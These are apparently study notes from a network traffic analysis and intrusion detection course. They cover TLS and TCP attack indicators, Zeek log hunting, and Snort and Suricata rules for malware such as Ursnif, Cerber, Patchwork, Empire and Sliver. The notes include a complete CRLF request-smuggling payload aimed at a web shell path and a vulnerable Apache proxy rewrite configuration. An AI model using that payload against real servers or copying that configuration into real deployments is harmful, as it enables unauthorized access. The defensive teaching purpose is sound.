**SSL Renegotiation Attack**

SSL renegotiation attacks attempt to negotiate lower encryption standards or exploit server resources, causing potential vulnerabilities. Another example of HTTPS encryption attacks includes the **Heartbleed Vulnerability (CVE-2014-0160)**.

---

**TLS and SSL Handshake Process**

To secure a connection, a TLS or SSL handshake is required, involving:

1. **Client Hello**: Client sends supported TLS/SSL versions, cipher suites, and random data.
2. **Server Hello**: Server responds with its chosen version, cipher suite, and a nonce.
3. **Certificate Exchange**: Server sends its certificate containing the public key.
4. **Key Exchange**: Client generates a premaster secret, encrypts it with the server’s public key, and sends it to the server.
5. **Session Key Derivation**: Both parties derive session keys using exchanged nonces and the premaster secret.
6. **Finished Messages**: Both parties exchange finished messages, confirming successful handshake.
7. **Secure Data Exchange**: The encrypted communication begins.

---

**TLS Handshake Algorithmic Breakdown**

| **Handshake Step** | **Relevant Calculations** |
|---|---|
| Client Hello | `ClientHello = { ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }` |
| Server Hello | `ServerHello = { ServerVersion, ServerRandom, Ciphersuite, CompressionMethod }` |
| Certificate Exchange | `ServerCertificate = { ServerPublicCertificate }` |
| Key Exchange | `ClientDHPublicKey = DH_KeyGeneration(ClientDHPrivateKey)ServerDHPublicKey = DH_KeyGeneration(ServerDHPrivateKey)` |
| Premaster Secret | `PremasterSecret = DH_KeyAgreement(ServerDHPublicKey, ClientDHPrivateKey)` |
| Session Key Derivation | `MasterSecret = PRF(PremasterSecret, "master secret", ClientNonce + ServerNonce)` |
| Extraction of Session Keys | `ClientWriteMACKey, ServerWriteMACKey, ClientWriteKey, ServerWriteKey, ClientWriteIV, ServerWriteIV` |
| Finished Messages | `FinishedMessage = PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))` |

---

**Detecting SSL Renegotiation Attacks**

1. **Filter for Handshake Messages**: In Wireshark, use the following filter to view only handshake messages:
  ```
  ssl.record.content_type == 22
  ```
2. **Indicators of SSL Renegotiation Attacks**:
  - **Multiple Client Hellos**: Repeated Client Hello messages from a single client in a short timeframe signal an attack, as the attacker repeatedly triggers renegotiation to downgrade the cipher suite.
  - **Out of Order Handshake Messages**: Observing Client Hello messages after the handshake completion can indicate manipulation or attack.

**Reasons for SSL Renegotiation Attacks**

- **Denial of Service**: Excessive renegotiation consumes server resources, potentially making it unresponsive.
- **Cipher Suite Exploitation**: Attackers may attempt renegotiation to exploit weak encryption configurations.
- **Cryptanalysis**: Renegotiation can facilitate cryptanalysis by helping attackers analyze SSL/TLS patterns, possibly exposing vulnerabilities.

#### **Strange HTTP Headers**

In analyzing web server traffic, the absence of obvious signs like fuzzing doesn’t guarantee security. Closer inspection, particularly of unusual HTTP headers, can reveal suspicious activity. Common anomalies include:

- **Weird Host Headers**
- **Unusual HTTP Verbs**
- **Modified User Agents**

---

**Finding Strange Host Headers**

1. **Filter for HTTP Traffic**: Start by limiting traffic in Wireshark to HTTP requests and responses:
  ```
  http
  ```
2. **Isolate Irregular Host Headers**: Specify the legitimate server IP to exclude normal traffic. For an external server, substitute with the domain name:
  ```
  http.request and (!(http.host == "192.168.10.7"))
  ```

**Indicators of Malicious Host Headers**

If results appear, examine them for host headers such as `127.0.0.1` or unusual hostnames like `admin`. Attackers often manipulate host headers to escalate privileges using proxy tools like Burp Suite.

**Preventative Measures**:

- Verify **virtualhost** and **access configurations** to prevent unauthorized access.
- Keep the **web server updated**.

---

**Analyzing Code 400s and Detecting Request Smuggling**

Error code 400 (Bad Request) can indicate suspicious activity and is useful in identifying malicious HTTP actions.

- **Filter for Code 400 Responses**:
  ```
  http.response.code == 400
  ```

By following these HTTP streams, you may uncover attempts at request smuggling, also known as **CRLF (Carriage Return Line Feed) Injection**.

**Example CRLF Attempt**

An attacker might craft a request like:

```
GET%20%2flogin.php%3fid%3d1%20HTTP%2f1.1%0d%0aHost%3a%20192.168.10.5%0d%0a%0d%0aGET%20%2fuploads%2fcmd2.php%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%3a8080%0d%0a%0d%0a%20HTTP%2f1.1 Host: 192.168.10.5
```

**Decoded by the server**:

```
GET /login.php?id=1 HTTP/1.1
Host: 192.168.10.5

GET /uploads/cmd2.php HTTP/1.1
Host: 127.0.0.1:8080

HTTP/1.1
Host: 192.168.10.5
```

If vulnerable, both requests succeed, allowing unauthorized access. This often results from Apache configurations like:

```
<VirtualHost *:80>
    RewriteEngine on
    RewriteRule "^/categories/(.*)" "<http://192.168.10.100:8080/categories.php?id=$1>" [P]
    ProxyPassReverse "/categories/" "<http://192.168.10.100:8080/>"
</VirtualHost>
```

This type of misconfiguration can leave servers susceptible to CVE-2023-25690, enabling request smuggling.

---

**Monitoring for Successful Exploits**

Detecting a **200 (Success)** status code in response to one of these requests confirms an exploit attempt. Regular monitoring of code 400 and code 200 responses is essential in traffic analysis to identify and mitigate adversarial actions.

#### **Strange Telnet & UDP Connections**

While analyzing network traffic, Telnet and UDP traffic can sometimes reveal suspicious or anomalous activities that might otherwise be overlooked.

---

**Telnet**

Telnet, a protocol for bidirectional interactive communication, is generally outdated due to security concerns and is commonly replaced by SSH. However, legacy systems (e.g., older Windows NT machines) may still rely on Telnet for remote command control, making it worth monitoring for any unusual connections.

**Detecting Traditional Telnet Traffic on Port 23**

When observing traffic on **Port 23** (Telnet’s default port) in Wireshark, examine communications closely for signs of misuse. Although Telnet traffic is unencrypted and straightforward to inspect, attackers may encrypt or obfuscate data in Telnet traffic, making it necessary to approach with caution.

**Unrecognized Telnet Traffic on Non-Standard Ports**

Telnet can operate on any port, and attackers may shift Telnet communications to non-standard ports. For example, communications on **Port 9999** might indicate an attempt to obscure malicious activity. In this case, follow the TCP stream to investigate further.

**Telnet Protocol through IPv6**

If IPv6 Telnet traffic is detected in an IPv4-configured network, this could indicate unauthorized access. To filter IPv6 Telnet traffic in Wireshark, use:

```
((ipv6.src_host == fe80::c9c8:ed3:1b10:f10b) or (ipv6.dst_host == fe80::c9c8:ed3:1b10:f10b)) and telnet
```

This filter helps isolate Telnet traffic on specific IPv6 addresses for in-depth inspection.

---

**Monitoring UDP Communications**

Attackers may use **UDP** to bypass typical TCP-based monitoring, as UDP’s connectionless, fast-transmission nature can be advantageous for covert data exfiltration.

**TCP vs. UDP**

UDP, unlike TCP, is connectionless, meaning no SYN, SYN/ACK, ACK handshake is required before transmission. This difference allows for faster communication, but also reduces reliability and accountability in tracking connections.

**Common Uses of UDP**

While investigating UDP traffic, consider these legitimate use cases:

1. **Real-time Applications**: Streaming media, gaming, and real-time voice/video rely on UDP for faster connections.
2. **DNS (Domain Name System)**: DNS queries and responses primarily use UDP.
3. **DHCP (Dynamic Host Configuration Protocol)**: UDP is used for assigning IP addresses and network configurations.
4. **SNMP (Simple Network Management Protocol)**: UDP supports network monitoring and management.
5. **TFTP (Trivial File Transfer Protocol)**: TFTP, used for basic file transfers, particularly in older systems, also uses UDP.

For unusual UDP traffic, follow the stream in Wireshark to inspect its contents and verify legitimacy.

#### **TCP Connection Resets & Hijacking**

TCP inherently lacks protection mechanisms to prevent attackers from terminating or hijacking connections. This vulnerability can manifest as connection termination via RST packets or through more advanced connection hijacking techniques.

---

**TCP Connection Termination**

In a TCP RST packet injection attack (also known as TCP connection termination), an attacker aims to disrupt network service. This attack involves:

1. **Source Spoofing**: The attacker spoofs the source address to match that of the target machine.
2. **RST Flag Injection**: The TCP packet is crafted with the RST flag to terminate the connection.
3. **Targeted Destination Port**: The attacker specifies a destination port in active use by the target machine.

**Detecting TCP RST Attacks**

- **High Packet Volume**: An unusual number of packets directed at a single port may indicate an RST attack.
- **MAC Address Discrepancy**: If packets with a spoofed IP (e.g., 192.168.10.4) show an unexpected MAC address not matching the registered one (e.g., `aa:aa:aa:aa:aa:aa`), this suggests malicious activity.

While MAC spoofing is possible, retransmissions or other inconsistencies may also arise, as seen in ARP poisoning scenarios.

---

**TCP Connection Hijacking**

In more sophisticated attacks, TCP connection hijacking allows attackers to monitor and control an active session. This attack involves:

1. **Sequence Number Prediction**: The attacker predicts sequence numbers to inject packets into the correct position within the target connection.
2. **Source Spoofing**: Similar to RST attacks, the attacker spoofs the source IP to impersonate the target machine.
3. **Blocking ACKs**: To maintain the hijacked connection, the attacker blocks or delays ACK packets from reaching the target. This is commonly done via ARP poisoning.

**Indicators of TCP Hijacking**

- **Sequence Anomalies**: Inconsistent or unusual sequence numbers may indicate sequence prediction attempts.
- **Blocked or Delayed ACKs**: ACK delays or absences can hint at attempts to hijack the session.

TCP connection hijacking often pairs with ARP poisoning, which may produce observable traffic anomalies.

#### **TCP Handshake Abnormalities**

When attackers probe TCP services, certain behaviors might deviate from normal traffic patterns. To understand these anomalies, let's first review the standard TCP 3-way handshake.

---

**TCP Handshake**

1. **SYN Request**: The client sends a TCP SYN request to initiate a connection.
2. **SYN-ACK Response**: If the port is open, the server responds with a SYN-ACK, indicating an open connection.
3. **Flags**: Various TCP flags signal specific actions or statuses during a connection.

| **Flag** | **Description** |
|---|---|
| URG | Urgent data stream |
| ACK | Acknowledges data receipt |
| PSH | Pushes data to application layer immediately |
| RST | Terminates the connection |
| SYN | Initiates a TCP connection |
| FIN | Ends a TCP connection |
| ECN | Notifies congestion |

---

**Indicators of Abnormal TCP Handshake Patterns**

- **Excessive Flags**: Multiple flags or repeated flags can indicate scanning.
- **Unusual Flags**: Irregular flag combinations may signal TCP RST attacks, hijacking attempts, or evasion tactics.
- **Single Host Targeting Multiple Ports or Hosts**: Scans often originate from one host targeting multiple ports or hosts. Decoy scans and random source attacks are also possible.

---

**Types of TCP Scans**

**Excessive SYN Flags**

One common scan type is SYN scanning, where attackers send SYN packets to target ports. Responses:

- **SYN Scan**: The attacker preemptively ends the handshake with an RST flag.
- **SYN Stealth Scan**: The attacker only partially completes the handshake to evade detection.

---

**No Flags (NULL Scan)**

NULL scans use TCP packets with no flags, producing the following responses:

- **Open Port**: No response from the system.
- **Closed Port**: The system replies with an RST packet.

---

**Excessive ACK Flags**

ACK scans use repeated ACK flags. Responses:

- **Open Port**: No response or an RST packet.
- **Closed Port**: Responds with an RST packet.

---

**Excessive FIN Flags**

In FIN scans, all packets are marked with the FIN flag. Responses:

- **Open Port**: No response from the system.
- **Closed Port**: The system replies with an RST packet.

---

**Xmas Tree Scan (All Flags Set)**

Xmas tree scans involve setting all TCP flags. Responses:

- **Open Port**: Either no response or an RST packet.
- **Closed Port**: Responds with an RST packet.

Xmas tree scans are distinct and straightforward to identify due to the presence of all flags.

**8. Introduction To IDS & IPS**

#### **Intrusion Detection With Zeek**

**Intrusion Detection Examples**

**Example 1: Detecting Beaconing Malware**

**Beaconing** is a repetitive process used by malware to communicate with command and control (C2) servers. This behavior can often be detected by analyzing connection patterns in `conn.log`, identifying repetitive connections to the same IP, constant data size, or timing patterns. The following command uses Zeek to analyze a beaconing malware sample:

```
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psempire.pcap
cat conn.log
```

Inspecting `conn.log` reveals beaconing behavior (connections to `51.15.197.127:80` every 5 seconds) typical of PowerShell Empire.

**Example 2: Detecting DNS Exfiltration**

DNS exfiltration, which mimics normal traffic, can be identified by analyzing Zeek's `files.log` or `dns.log` for large data transfers or covert channels. `dns.log` may show unusual domains or subdomain patterns, as seen here:

```
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/dnsexfil.pcapng
cat dns.log | /usr/local/zeek/bin/zeek-cut query | cut -d . -f1-7
```

Frequent subdomains like `456c54f2.blue.letsgohunt.online` indicate potential DNS tunneling.

**Example 3: Detecting TLS Exfiltration**

TLS exfiltration may be detected by looking at high data transfer volumes between specific hosts. The `conn.log` file can be filtered and aggregated to identify unusual data sizes:

```
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/tlsexfil.pcap
cat conn.log | /usr/local/zeek/bin/zeek-cut id.orig_h id.resp_h orig_bytes | \\
sort | grep -v -e '^$' | grep -v '-' | datamash -g 1,2 sum 3 | sort -k 3 -rn | head -10
```

This shows ~270 MB of data sent to `192.168.151.181`.

**Example 4: Detecting PsExec Activity**

**PsExec** is commonly used in remote administration and attacks. When transferred over SMB and executed via IPC, `smb_files.log`, `dce_rpc.log`, and `smb_mapping.log` can help identify this activity.

```
/usr/local/zeek/bin/zeek -C -r /home/htb-student/pcaps/psexec_add_user.pcap
cat smb_files.log
cat dce_rpc.log
cat smb_mapping.log
```

The logs display the transfer of `PSEXESVC.exe` and its execution, highlighting PsExec’s typical activity.

**Commands and Tools Summary**

- **Zeek-cut**: Extracts specified columns from Zeek logs.
- **Sort**: Orders log data for easier analysis.
- **Grep**: Filters log data.
- **Datamash**: Aggregates data, useful for summing and grouping fields.

Each command aids in refining and focusing the output, making suspicious patterns more apparent. Analyzing logs using tools like Wireshark or Zeek-cut allows detailed inspection of traffic.

#### **Snort Fundamentals**

Snort is an open-source tool functioning as an Intrusion Detection System (IDS) and Intrusion Prevention System (IPS). It can also act as a packet logger or sniffer. Snort inspects all network traffic and can log every activity, providing visibility and comprehensive logging at the application layer. Specific rule sets direct Snort on what to inspect and identify.

---

**Snort Operation Modes**

Snort operates in several modes:

1. **Inline IDS/IPS**: Enables active traffic blocking in IPS mode.
2. **Passive IDS**: Observes and logs traffic without blocking.
3. **Network-based IDS**: Monitors network traffic from multiple hosts.
4. **Host-based IDS**: Rarely used for Snort; specialized tools are preferable.

**DAQ (Data Acquisition)**:

- Snort uses DAQ modules to interface with network data sources.
- Modes:
  - **Passive**: Observes traffic but doesn’t block it.
  - **Inline**: Blocks traffic in specific scenarios (e.g., `Q` flag with `afpacket` DAQ).

---

**Snort Architecture**

1. **Packet Sniffer**: Decodes network traffic, forwarding packets to Preprocessors.
2. **Preprocessors**: Analyze packet types and behaviors. Configured in `snort.lua`, these modules perform tasks such as detecting HTTP traffic or scanning.
3. **Detection Engine**: Matches packets against Snort rules.
4. **Logging and Alerting**: Logs matched packets, typically in syslog or databases, managed by Output plugins in `snort.lua`.

---

**Snort Configuration**

**Configuration Files**:

- `snort.lua`: Main configuration file for Snort, with sections for network variables, decoders, detection engines, and output configurations.
- **Default Configurations**: Provided by `snort_defaults.lua`, this file initializes default configurations.

To view or edit the configuration file:

```
sudo more /root/snorty/etc/snort/snort.lua
```

**Validating Snort Configuration**

To validate configuration:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq
```

---

**Snort Inputs**

**Running Snort on PCAP Files**

To observe Snort’s behavior with a PCAP file:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /path/to/pcapfile.pcap
```

**Running Snort on an Active Network Interface**

To actively monitor network traffic:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -i interface_name
```

---

**Snort Rules**

Snort rules consist of headers and options. They can be configured within `snort.lua` under the `ips` section:

```
ips = {
    { variables = default_variables, include = '/path/to/rules/file.rules'}
}
```

**Loading Rules via Command Line**

1. **Single File**: `R /path/to/rules/file.rules`
2. **Directory of Rules**: `-rule-path /path/to/rules`

---

**Snort Outputs**

Snort provides various output types for alerting and statistics:

1. **Basic Statistics**: Summarizes packet counts, activity counts, file statistics, and runtime performance.
2. **Alert Outputs**:
  - `A cmg`: Combines fast alerting with packet headers and payload.
  - `A u2`: Unified2 binary format, used for post-processing.
  - `A csv`: CSV format output.
3. **Performance Statistics**: Tracks runtime performance, providing memory and CPU utilization details, helpful for optimizing system performance.

To list available output plugins:

```
snort --list-plugins | grep logger
```

Example of `-A cmg` alert output:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -r /path/to/pcapfile.pcap -A cmg
```

---

**Snort Key Features**

1. Deep packet inspection and logging.
2. Real-time intrusion detection.
3. Network security monitoring.
4. Support for IPv4 and IPv6 traffic.
5. Anomaly detection and multi-tenant support.

#### **Snort Rule Development**

A Snort rule is a powerful tool to identify and flag potential malicious activity in network traffic.

While Snort rules resemble Suricata rules with a structure comprising a rule header and rule options, the Snort documentation provides comprehensive guidance for crafting effective rules. See [Snort Documentation](https://docs.snort.org/) and [Suricata Rules Differences](https://docs.suricata.io/en/latest/rules/differences-from-snort.html) for further reference.

To explore these rules in practice, SSH into the provided target system to replicate and understand the commands demonstrated in this section.

---

**Example 1: Detecting Ursnif (Inefficiently)**

```
alert tcp any any -> any any (msg:"Possible Ursnif C2 Activity"; flow:established,to_server; content:"/images/", depth 12; content:"_2F"; content:"_2B"; content:"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"; content:!"Accept"; content:!"Cookie|3a|"; content:!"Referer|3a|"; sid:1000002; rev:1;)
```

This rule detects Ursnif malware by matching specific patterns in HTTP traffic:

- `flow:established,to_server;` matches established TCP connections to the server.
- `content:"/images/", depth 12;` looks for `/images/` within the first 12 bytes.
- Additional `content` fields match other patterns, like `"_2F"`, `"_2B"`, and specific HTTP headers.
- `!` in `content:!"Accept";` indicates the absence of certain headers.

Test the rule on `ursnif.pcap`:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/ursnif.pcap -A cmg
```

---

**Example 2: Detecting Cerber**

```
alert udp $HOME_NET any -> $EXTERNAL_NET any (msg:"Possible Cerber Check-in"; dsize:9; content:"hi", depth 2, fast_pattern; pcre:"/^[af0-9]{7}$/R"; detection_filter:track by_src, count 1, seconds 60; sid:2816763; rev:4;)
```

This rule targets Cerber malware:

- `dsize:9;` restricts the rule to datagrams with a 9-byte payload.
- `content:"hi", depth 2, fast_pattern;` searches the first two bytes for `hi`.
- `pcre` checks for seven hex characters following `hi`.
- `detection_filter` limits alert frequency by source.

Run the rule on `cerber.pcap`:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/cerber.pcap -A cmg
```

---

**Example 3: Detecting Patchwork**

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"; flow:established,to_server; http_method; content:"POST"; http_uri; content:".php?profile="; http_client_body; content:"ddager=", depth 7; http_client_body; content:"&r1=", distance 0; http_header; content:!"Accept"; http_header; content:!"Referer|3a|"; sid:10000006; rev:1;)
```

This rule detects Patchwork APT malware by matching HTTP patterns:

- `flow:established,to_server;` specifies outbound connections.
- `http_method; content:"POST";` requires HTTP `POST` requests.
- `http_client_body` and `http_header` filter for specific content and missing headers.

Test with `patchwork.pcap`:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
```

---

**Example 4: Detecting Patchwork (SSL)**

```
alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Patchwork SSL Cert Detected"; flow:established,from_server; content:"|55 04 03|"; content:"|08|toigetgf", distance 1, within 9; classtype:trojan-activity; sid:10000008; rev:1;)
```

This SSL rule detects Patchwork malware through certificate patterns:

- `content:"|55 04 03|";` targets ASN.1 common name fields in X.509 certificates.
- `distance` and `within` further refine the search.

Run with `patchwork.pcap`:

```
sudo snort -c /root/snorty/etc/snort/snort.lua --daq-dir /usr/local/lib/daq -R /home/htb-student/local.rules -r /home/htb-student/pcaps/patchwork.pcap -A cmg
```

#### **Suricata Fundamentals**

Suricata, managed by the Open Information Security Foundation (OISF), is an open-source network security solution ideal for Network Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), and Network Security Monitoring (NSM). It excels in deep packet inspection and offers extensive logging, helping administrators detect and respond to suspicious activities within network traffic.

---

**Suricata Operation Modes**

1. **Intrusion Detection System (IDS)**: Passively monitors traffic, flags potential threats, and enhances network visibility but does not intervene.
2. **Intrusion Prevention System (IPS)**: Acts proactively by blocking suspicious traffic before it enters the network, enhancing security at the cost of added latency.
3. **Intrusion Detection Prevention System (IDPS)**: Combines IDS and IPS features, passively monitoring but also capable of sending reset packets (RST) to terminate suspicious sessions.
4. **Network Security Monitoring (NSM)**: Purely logs all network data, focusing on capturing every data transaction for forensic and retrospective analysis.

---

**Suricata Inputs**

- **Offline Input**: Processes stored PCAP files, suitable for retrospective analysis and rule testing.
- **Live Input**:
  - **LibPCAP**: Reads packets from network interfaces; limited in performance.
  - **NFQ**: Linux-only, inline IPS mode leveraging IPTables to pass packets to Suricata for inspection.
  - **AF\_PACKET**: Enhanced version of LibPCAP, supporting multi-threading; suitable for live analysis on compatible Linux systems.

---

**Suricata Outputs**

Suricata logs various outputs, including alerts, DNS requests, HTTP requests, and network flow data. Key outputs include:

- **EVE JSON**: Logs events in JSON format for compatibility with tools like Logstash, covering event types such as alerts, DNS, HTTP, and TLS.
- **Unified2**: Snort-compatible binary alert format, allowing integration with Snort tools like `u2spewfoo`.

**Example of Viewing EVE JSON**

```
Kailez@htb[/htb]$ less /var/log/suricata/old_eve.json
```

---

**Configuring Suricata & Custom Rules**

1. **Listing Rule Files**: View available rule files.
  ```
  Kailez@htb[/htb]$ ls -lah /etc/suricata/rules/
  ```
2. **Modifying Suricata Variables**: Define `$HOME_NET` and `$EXTERNAL_NET` in `suricata.yaml` to represent trusted and untrusted network segments, respectively.
3. **Adding Custom Rules**:
  - Example rule to alert on HTTP transactions:
    ```
    alert http any any -> any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
    ```

---

**Hands-on with Suricata Inputs**

- **Offline Analysis**:
  ```
  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/suspicious.pcap
  ```
- **Live Input using AF\_PACKET**:
  ```
  Kailez@htb[/htb]$ sudo suricata --af-packet=ens160
  ```
- **Using**`tcpreplay`**to Simulate Traffic**:
  ```
  Kailez@htb[/htb]$ sudo tcpreplay -i ens160 /home/htb-student/pcaps/suspicious.pcap
  ```

---

**Suricata Logs**

1. **EVE JSON**: A comprehensive JSON format log containing event types like alerts, HTTP, DNS, and TLS metadata.
  ```
  Kailez@htb[/htb]$ less /var/log/suricata/old_eve.json
  ```
  - To view only alert events:
    ```
    cat /var/log/suricata/old_eve.json | jq -c 'select(.event_type == "alert")'
    ```
2. **fast.log**: Text-based log recording alerts only, useful for quick review.
  ```
  Kailez@htb[/htb]$ cat /var/log/suricata/old_fast.log
  ```
3. **stats.log**: Displays statistics and resource usage, useful for performance monitoring.
  ```
  Kailez@htb[/htb]$ cat /var/log/suricata/old_stats.log
  ```

---

**File Extraction**

Suricata can extract files transferred over protocols for forensic analysis.

1. **Enabling File Extraction** in `suricata.yaml`:
  ```
  file-store:
    version: 2
    enabled: yes
    force-filestore: yes
  ```
2. **Adding a Custom Extraction Rule**:
  - Example:
    ```
    alert http any any -> any any (msg:"FILE store all"; filestore; sid:2; rev:1;)
    ```
3. **Running Suricata on a PCAP**:
  ```
  Kailez@htb[/htb]$ suricata -r /home/htb-student/pcaps/vm-2.pcap
  ```
4. **Inspecting Extracted Files**:
  ```
  Kailez@htb[/htb]$ cd filestore
  Kailez@htb[/htb]$ find . -type f
  ```

---

**Updating and Reloading Rules**

1. **Enable Live Rule Reloading**:
  ```
  detect-engine:
    - reload: true
  ```
  - Reload rules:
    ```
    Kailez@htb[/htb]$ sudo kill -usr2 $(pidof suricata)
    ```
2. **Updating Rulesets** with `suricata-update`:
  ```
  Kailez@htb[/htb]$ sudo suricata-update
  ```
3. **Listing Available Ruleset Sources**:
  ```
  Kailez@htb[/htb]$ sudo suricata-update list-sources
  ```
4. **Enabling Specific Rulesets**:
  ```
  Kailez@htb[/htb]$ sudo suricata-update enable-source et/open
  ```

---

**Validating Suricata Configuration**

Validate the configuration file to ensure Suricata is correctly set up.

```
Kailez@htb[/htb]$ sudo suricata -T -c /etc/suricata/suricata.yaml
```

---

**Key Features of Suricata**

- **Deep Packet Inspection**: Full inspection of packet content and headers.
- **Protocol Detection**: Supports multiple protocols, providing comprehensive network monitoring.
- **Intrusion Detection and Prevention**: Versatile modes for both passive and active defense.
- **File Extraction**: Captures files transferred over certain protocols for forensic analysis.
- **Live Rule Reloading**: Updates rules without service interruption.
- **Extensive Logging**: JSON, fast.log, and more, for customizable insights into network traffic.

Suricata's functionality makes it an effective tool for maintaining network security through vigilant and detailed monitoring of network traffic.

#### **Suricata Rule Development Part 1**

Suricata rules are used to monitor network traffic for specific patterns or markers, often indicative of malicious behavior. These rules can provide critical insights into network activity, aid in threat detection, and contribute to proactive network security strategies.

---

**Suricata Rule Anatomy**

Here's an example of a basic Suricata rule:

```
action protocol from_ip port -> to_ip port (msg:"Known malicious behavior, possible X malware infection"; content:"some thing"; content:"some other thing"; sid:10000001; rev:1;)
```

**Components of the Rule:**

1. **Header (action protocol from\_ip port -> to\_ip port)**:
  - **Action**: Tells Suricata what to do when the rule matches:
    - `alert`: Generate an alert.
    - `log`: Log the packet without an alert.
    - `drop`: Block the packet (IPS mode).
  - **Protocol**: Specifies the network protocol (`tcp`, `udp`, `icmp`, etc.).
  - **Traffic Direction**:
    - `>` for outbound, `<-` for inbound, and `<->` for bidirectional.
  - **Ports**: Define source and destination ports for evaluation.
2. **Rule Message and Content**:
  - **msg**: Description shown when the rule triggers, often including malware info.
  - **content**: Specific strings or values that Suricata searches for in the packet payload.
    - Example:
      ```
      content:"User-Agent|3a 20|Go-http-client/1.1|0d 0a|Accept-Encoding|3a 20|gzip";
      ```
    - Content can be optimized with rule buffers, such as `http.accept` for matching only HTTP Accept headers.
3. **Additional Options**:
  - **nocase**: Makes the rule case-insensitive.
  - **offset**: Sets the starting position in the packet for matching.
  - **distance**: Specifies the byte distance from the previous match.
  - **dsize**: Matches on packet payload size (e.g., `dsize:>10000` for large packets).
4. **Metadata**:
  - **sid**: Signature ID for uniquely identifying each rule.
  - **rev**: Revision number indicating rule updates.
  - **reference**: A URL or identifier providing context or sources for the rule.

---

**Example Rule Usage with PCRE**

Perl Compatible Regular Expressions (PCRE) enhance detection flexibility. Here’s an example:

```
alert http any any -> $HOME_NET any (msg: "ATTACK [PTsecurity] Apache Continuum <= v1.4.2 CMD Injection"; content: "POST"; http_method; content: "/continuum/saveInstallation.action"; offset: 0; depth: 34; http_uri; content: "installation.varValue="; nocase; http_client_body; pcre: !"/^\\$?[\\sa-z\\\\_0-9.-]*(\\&|$)/iRP"; flow: to_server, established; sid: 10000048; rev: 1;)
```

- **PCRE**: Allows complex pattern matching using regular expressions. It is wrapped in `/.../` and can use flags like `i` for case insensitivity and `RP` for relative positioning.

---

**IDS/IPS Rule Development Approaches**

- **Signature-Based Detection**: Matches known patterns (e.g., malware strings or packet structures). It’s precise for known threats but limited in detecting new ones.
- **Anomaly-Based Detection**: Focuses on unusual network behaviors (e.g., data transfer patterns). It helps detect zero-day attacks but may yield false positives.
- **Stateful Protocol Analysis**: Tracks protocol states to identify unusual transitions or behaviors, suitable for identifying protocol misuse.

---

**Suricata Rule Development Examples**

**Example 1: Detecting PowerShell Empire**

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"ET MALWARE Possible PowerShell Empire Activity Outbound"; flow:established,to_server; content:"GET"; http_method; content:"/"; http_uri; depth:1; pcre:"/^(?:login\\/process|admin\\/get|news)\\.php$/RU"; content:"session="; http_cookie; pcre:"/^(?:[A-Z0-9+/]{4})*(?:[A-Z0-9+/]{2}==|[A-Z0-9+/]{3}=|[A-Z0-9+/]{4})$/CRi"; content:"Mozilla|2f|5.0|20 28|Windows|20|NT|20|6.1"; http_user_agent; http_start; content:".php|20|HTTP|2f|1.1|0d 0a|Cookie|3a 20|session="; fast_pattern; http_header_names; content:!"Referer"; content:!"Cache"; content:!"Accept"; sid:2027512; rev:1;)
```

- Detects HTTP GET requests from PowerShell Empire with specific URI patterns and base64-encoded cookies.
- Matches on `User-Agent` and excludes headers like `Referer`.

**Example 2: Detecting Covenant**

```
alert tcp any any -> $HOME_NET any (msg:"detected by body"; content:"<title>Hello World!</title>"; detection_filter: track by_src, count 4 , seconds 10; priority:1; sid:3000011;)
```

- Triggers on HTTP responses containing `<title>Hello World!</title>` at least four times within 10 seconds from the same source.

**Example 3: Covenant Detection by Size and Counter**

```
alert tcp $HOME_NET any -> any any (msg:"detected by size and counter"; dsize:312; detection_filter: track by_src, count 3 , seconds 10; priority:1; sid:3000001;)
```

- Detects payloads of exactly 312 bytes sent at least three times within a 10-second window.

**Example 4: Detecting Sliver C2 Implant**

```
alert tcp any any -> any any (msg:"Sliver C2 Implant Detected"; content:"POST"; pcre:"/\\/(php|api|upload|actions|rest|v1|oauth2callback|authenticate|oauth2|oauth|auth|database|db|namespaces)(.*?)((login|signin|api|samples|rpc|index|admin|register|sign-up)\\.php)\\?[a-z_]{1,2}=[a-z0-9]{1,10}/i"; sid:1000007; rev:1;)
```

- Detects HTTP POST requests to URIs associated with Sliver, a C2 framework, using specific directory and PHP file patterns.

**Additional Rule for Sliver Detection via Cookies**

```
alert tcp any any -> any any (msg:"Sliver C2 Implant Detected - Cookie"; content:"Set-Cookie"; pcre:"/(PHPSESSID|SID|SSID|APISID|csrf-state|AWSALBCORS)\\=[a-z0-9]{32}\\;/"; sid:1000003; rev:1;)
```

- Detects cookies set with names like `PHPSESSID` or `APISID` and values matching a 32-character alphanumeric pattern, often associated with Sliver.

For further reference and advanced rule development techniques, explore [Suricata’s official rule documentation](https://docs.suricata.io/en/latest/rules/index.html).

#### **Suricata Rule Development Part 2 (Encrypted Traffic)**

Encrypted traffic presents challenges for network security analysis as SSL/TLS encryption hides packet contents. However, there are still identifiable features in encrypted traffic that we can leverage for detection, particularly through SSL/TLS certificates and JA3 fingerprinting.

---

**Key Techniques for Detecting Encrypted Traffic Threats**

